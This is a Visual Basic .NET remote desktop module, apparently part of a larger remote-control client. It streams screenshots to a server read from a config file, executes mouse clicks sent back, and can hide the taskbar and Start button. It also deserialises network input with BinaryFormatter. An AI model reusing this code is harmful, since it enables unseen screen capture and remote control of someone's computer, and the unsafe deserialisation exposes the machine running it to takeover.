Imports System.Net.Sockets
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.IO
Imports System.Runtime.InteropServices
Public Class RemoteDesktop
    Dim YO As New TcpClient
    Dim NS As NetworkStream

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        Dim BF As New BinaryFormatter
        Dim IMAGEN As Bitmap
        Try
            Dim BM As Bitmap
            BM = New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
            Dim DIBUJO As Graphics
            DIBUJO = Graphics.FromImage(BM)
            DIBUJO.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size)
            DIBUJO.DrawImage(BM, 0, 0, BM.Width, BM.Height)
            IMAGEN = New Bitmap(BM)
            Dim DIBUJO2 As Graphics
            DIBUJO2 = Graphics.FromImage(IMAGEN)
            Dim MICURSOR As Cursor = Cursors.Hand
            Dim RECTANGULO As New Rectangle(Cursor.Position.X, Cursor.Position.Y, MICURSOR.Size.Width, MICURSOR.Size.Height)
            MICURSOR.Draw(DIBUJO2, RECTANGULO)
            Dim MS As New MemoryStream
            IMAGEN.Save(MS, Imaging.ImageFormat.Png)
            IMAGEN = Image.FromStream(MS)
            NS = YO.GetStream
            BF.Serialize(NS, IMAGEN)
        Catch ex As Exception
            Console.WriteLine("[RemoteDesktop@Timer1_Tick]Error: " & ex.Message)
        End Try
    End Sub

    Private Sub Timer2_Tick(sender As System.Object, e As System.EventArgs) Handles Timer2.Tick
        Try
            NS = YO.GetStream
            Dim BF As New BinaryFormatter
            If NS.DataAvailable Then
                Dim MENSAJE As String = System.Text.Encoding.UTF7.GetString(BF.Deserialize(NS))
                ORDENES(MENSAJE)
            End If
        Catch ex As Exception
            Console.WriteLine("[RemoteDesktop@Timer2_Tick]Error: " & ex.Message)
        End Try
    End Sub
    Public Sub ORDENES(ByVal ORDEN As String)
        Try
            Dim PARTES As String() = ORDEN.Split(":")
            POSICIONX = PARTES(1)
            POSICIONY = PARTES(2)
            Cursor.Position = New Point(POSICIONX, POSICIONY)
            Select Case PARTES(0)
                Case "IZQUIERDO"
                    CLICKIZDO()
                Case "DOBLE"
                    CLICKIZDO()
                    CLICKIZDO()
            End Select
        Catch ex As Exception
            Console.WriteLine("[RemoteDesktop@ORDENES]Error: " & ex.Message)
        End Try
    End Sub

    Dim POSICIONX As Integer
    Dim POSICIONY As Integer

    <DllImport("user32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)>
    Public Shared Sub mouse_event(dwFlags As Integer, dx As Integer, dy As Integer, cButtons As Integer, dwExtraInfo As Integer)
    End Sub

    Private Const MOUSEEVENTF_LEFTDOWN As Integer = &H2
    Private Const MOUSEEVENTF_LEFTUP As Integer = &H4
    Private Const MOUSEEVENTF_RIGHTDOWN As Integer = &H8
    Private Const MOUSEEVENTF_RIGHTUP As Integer = &H10

    Public Sub CLICKIZDO()
        mouse_event(MOUSEEVENTF_LEFTDOWN, POSICIONX, POSICIONY, 0, 0)
        mouse_event(MOUSEEVENTF_LEFTUP, POSICIONX, POSICIONY, 0, 0)
    End Sub

    Public Sub CLICKDCHO()
        mouse_event(MOUSEEVENTF_RIGHTDOWN, POSICIONX, POSICIONY, 0, 0)
        mouse_event(MOUSEEVENTF_RIGHTUP, POSICIONX, POSICIONY, 0, 0)
    End Sub

    <DllImport("user32.dll")>
    Private Shared Function FindWindow(className As String, windowText As String) As IntPtr
    End Function
    <DllImport("user32.dll")>
    Private Shared Function ShowWindow(hwnd As IntPtr, command As Integer) As Boolean
    End Function
    Private Const SW_HIDE As Integer = 0
    Private Const SW_SHOW As Integer = 1

    Public Function OCULTABARRA() As Boolean
        Dim retval = False
        Dim hwndTaskBar = FindWindow("Shell_TrayWnd", "")
        If hwndTaskBar <> IntPtr.Zero Then
            retval = ShowWindow(hwndTaskBar, SW_HIDE)
        End If
        Return retval
    End Function

    Public Function OCULTAINICIO() As Boolean
        Dim retval = False
        OCULTABARRA()
        Dim hwndStartButton = FindWindow("Button", "Start")
        If hwndStartButton <> IntPtr.Zero Then
            retval = ShowWindow(hwndStartButton, SW_HIDE)
        End If
        Return retval
    End Function

    Public Function MUESTRABARRA() As Boolean
        Dim retval2 = False
        Dim hwndTaskBar = FindWindow("Shell_TrayWnd", "")
        If hwndTaskBar <> IntPtr.Zero Then
            retval2 = ShowWindow(hwndTaskBar, SW_SHOW)
        End If
        Return retval2
    End Function

    Public Function MUESTRAINICIO() As Boolean
        Dim retval1 = False
        MUESTRABARRA()
        Dim hwndstartbutton = FindWindow("Button", "Start")
        If hwndstartbutton <> IntPtr.Zero Then
            retval1 = ShowWindow(hwndstartbutton, SW_SHOW)
        End If
        Return retval1
    End Function

    Private Sub RemoteDesktop_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Console.WriteLine("RemoteDesktop Iniciado!")
        TCPCMDReader.DiagnosticPosting("RemoteDesktop Iniciado!", "TCP.DGN.RemoteDesktop", True, False)
        Dim ServerIP As String = Nothing
        Try
            Dim Lineas = IO.File.ReadLines(Starter.DIRCommons & "\DataBase.ini")
            ServerIP = Lineas(1).Split(">"c)(1).Trim()
            TCPCMDReader.DiagnosticPosting("Server IP: " & ServerIP, "TCP.DGN.RemoteDesktop", True, False)
        Catch ex As Exception
            Console.WriteLine("[RemoteDesktop@RemoteDesktop_Load(GetDataBaseIP)]Error: " & ex.Message)
        End Try
        Try
            YO.Connect(ServerIP, "21112")
            Timer1.Interval = 3500
            Timer1.Start()
            Timer2.Interval = 1500
            Timer2.Start()
            TCPCMDReader.DiagnosticPosting("IP: " & ServerIP & "Port: " & "21112", "TCP.DGN.RemoteDesktop", True, False)
        Catch ex As Exception
            Console.WriteLine("[RemoteDesktop@RemoteDesktop_Load]Error: " & ex.Message)
        End Try
    End Sub

    Private Sub RemoteDesktop_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Console.WriteLine("RemoteDesktop Cerrado!")
        TCPCMDReader.DiagnosticPosting("RemoteDesktop Cerrado!", "TCP.DGN.RemoteDesktop", True, False)
        Try
            NS.Dispose()
        Catch ex As Exception
            Console.WriteLine("[RemoteDesktop@RemoteDesktop_FormClosing(NS.Dispose())]Error: " & ex.Message)
        End Try
        Try
            YO.Close()
        Catch ex As Exception
            Console.WriteLine("[RemoteDesktop@RemoteDesktop_FormClosing(YO.Close())]Error: " & ex.Message)
        End Try
    End Sub
End Class
